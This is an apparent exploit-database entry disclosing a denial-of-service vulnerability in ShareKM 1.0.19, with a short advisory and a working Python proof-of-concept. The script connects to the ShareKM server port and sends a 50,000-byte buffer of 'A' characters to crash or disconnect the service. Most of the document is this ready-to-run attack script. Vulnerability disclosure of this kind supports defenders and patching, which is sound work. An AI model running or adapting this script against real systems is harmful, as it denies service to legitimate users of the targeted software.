source: http://www.securityfocus.com/bid/62586/info

ShareKM is prone to a denial-of-service vulnerability.

An attacker can exploit this issue to cause the server to crash or disconnect, denying service to legitimate users.

ShareKM 1.0.19 is vulnerable; prior versions may also be affected. 

#!/usr/bin/python
import socket
 
TCP_IP = '192.168.1.100'
TCP_PORT = 55554
BUFFER_SIZE = 1024
MESSAGE = "\x41" * 50000
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
s.send(MESSAGE)
s.close()
